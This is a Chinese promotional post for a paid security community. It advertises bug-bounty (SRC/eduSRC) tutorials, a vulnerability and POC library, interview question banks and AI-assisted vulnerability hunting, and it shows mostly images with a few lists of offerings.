![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg "")  
  
src挖掘基础  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg "")  
  
src挖掘实战  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRjVmJn3g5b23ur9E6Cx3O68f0hXVjCiaj8J4RYeTGBecqf1k99phG0ice2wtd5lKgR46OeqeLQfMpk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRbZ1HYm7R7YEiaxRVQibGWyricx9l7HpGjS4ZfWRdlft8iacwkpzYyZfmYEkWdJgYRORPkNFR6dADR5MyE524tWX6cAwN8MmrCZu0/640?wx_fmt=png&from=appmsg "")  
  
  
edusrc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVVlTXhibjR8UiakZBQicXRZrQ7hdoOz5G8MQrcuDBGbqJdO0kIz6R9IU4ObAeOiabT8pr6lc7jibdIkKoTjiaXNHPLAwAB3BV2UvLM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSCrvarBbzP4L9kS6P0LVH9JMdmcbFDKiaicHqMFgTxq3x4iatjDJQicmc7NPC14C9Fk3icFjrouSgNVaN8Byuf0C0Iq9O6D1XPvFvY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRALwXmgZ4mh2LW0RdicrKjBCP7P1iaF14G0Eq2v3KRnTJORpwXZlF58WEz6QicxLJpyJaA5iah5CF2rHjBz4JzOELFRaZTAKOQ2tQ/640?wx_fmt=png&from=appmsg "")  
  
经典nday复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRu8Gf849iaCkSBxLL8IlzJTRs185QicEe9l5UGI1dEVKISt2IGGveZynXBW9tIUsxNsz4adSTib7rib50uSJdjNfTvVRFrbPJhzL4/640?wx_fmt=png&from=appmsg "")  
  
  
云安全&AI安全  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ9qiavETNjaaX162czpNCqpw3uJqVpicbI15AXzhf5x8icmHxBdTGOgRgzNPGF3Aw2gglT4Fx09JGXYibQC6U7CQKVmoH08l3meia4/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQgcsjiaZ4S26TWowHfpBkhSeHf2pjrcDyicJuia3uqvRBauLEOicibibEMqibnBMtjopFL8No7UXNibbURvzeJ3dQHTibvGxRQGnorb4co/640?wx_fmt=png&from=appmsg "")  
  
**陌笙安全漏洞库介绍**  
```
最新漏洞查看
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTFBRMa8XwYxfcZMyXicx94xSKxawPcqFia2rJKOL7fSLYXiccwHc868XxNGIQ5z7ibiaI1MNAGRrK7U6wXJTsZOCAu2I5XV1boTAL4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSBzdakI9XI33ReAm2dxO8vgzw3JicQmUuWCb5ayBlKR1PoQHEHFETteBnicyupwU0mXvXibfrDoyg8nSWBGoK1p2YXY3ElhcvOQ0/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSajCclDhuRpaLic9Ld915CHU7RqSC1LCrPGfNZiavdPEVeDedDWOPBhtMLCicTp3RNd1lT0Pmfo3mx5B0hUxbQg3ic6Via90NMtZVk/640?wx_fmt=png&from=appmsg "")  
  
****  
****  
**陌笙安全面试库**  
```
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
绿盟笔试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSoLqEzH0a3A4LQrvTIkGx81Sh5pf6fCoEQJhYg715vrJicSkfBuCoAmV2Kp4uOMe5jcUZutPwicibFibtJ1ZmyiaAibCg0XicWnsNcicE/640?wx_fmt=png&from=appmsg "")  
  
****  
**POC库****&&更新适配afrog&&nuclei&&dddd的POC&1day/Nday等&&**  
**dddd二开****工具[助力渗透测试&&红蓝攻防]**  
  
**工具截图**  
  
****  
**实战效果**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSKqLXNcOPE07xOwOUCjRGuFphopPumW9RaticmNCuEUXu52GtdTTfpTUicrBj80kMcZzJsnps3abyvXIvLHEIhvMoXUApOqZCe4/640?wx_fmt=png&from=appmsg "")  
  
****  
**poc库【后续持续更新】**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTG9Lyp44aFffUOxQKtHjToGfqFWTjswYft0VtAPINtV5MqmrTTj8GWrVb6yowvHURubPgOqdribmibWEb0Fcj3YdN4iahUwItcxE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRAMJIIvexOOJa5KhrsKmlsx8bkwib9SPoK72Q0OSPWR5qx67yvl8scMQ5bg8caBXZH01kM39RDnKpnWSaTicgobRmLygERGFWls/640?wx_fmt=png&from=appmsg "")  
  
  
**AI赋能-**  
**skill辅助**  
**漏洞挖掘（免责&&慎用）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR3Dib0RVxVhUOzS6ibC6BvkfulXQAclic0XCXMS35C4EPoqX1b2eMVj2CFiaLCelVs1szGibaHiaAq7WibRdwHUg0IwO8fjDdWxNv6eY/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSXZZVels2NibmHgyxntlCRNIkgoqMPfUPwSM9O43OqniaZLDEJic9QRkW01gNTydFkibdI6yBRkJJ1sDUmfl7iaicoibz1QLp0J2pWE4/640?wx_fmt=png&from=appmsg "")  
  
  
**圈友skill+ai辅助渗透**  
**实战效果**  
**，支持打假！**  
  
证书站  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQibuxKAyHBZicB1t5yGVKyV82Teo8C2MbjKPytKziaXUcjPiao8ylHbD4vicAld8equC9alic3NksvWJ09wArXaPXZD10vjPtfoia4Vg/640?wx_fmt=png&from=appmsg "")  
  
普通站点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ1Xt6gdLgd2d1mf8QURQX4YZjHA2uIw9GdTuxzSafBVOJzrQVmHJlqdhVWdVDj3OQsiaQhYOaoiabXc6EgajvBMvB6xBZwdJkIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙**  
**纷传****圈子介**  
**绍**  
```
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSY2pbvbP3qGAlW8O43bRvAISCxZm4UDTRsaMVbJKTsjfTMTDlq6qNBcVs4tkl4UzgqGz5ag81baU1rusKE09J9T6cMVliaibibwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboTrLRQpTicOR7bzyNiajiapVJgyMiaYlEDBVU87YXMnanOFWsCYN3cCVGsKkibzV9dMryvbFXBb4Z3472ib27RJ1Xq1HnKJIp5u49GYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**目前800多条内容，扫描下方二维码查看详情以及加入圈子，持续更新中。。**  
  
**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS6aWPIgWkKicUwu8ZiamtqWhg7UcFK22okQrXnQcTZxiaXFVrl4QXmUMxrSOic69VyUlQictbauRDrKXllL810lAWMOtcOvb9taUAM/640?wx_fmt=png&from=appmsg "")  
  
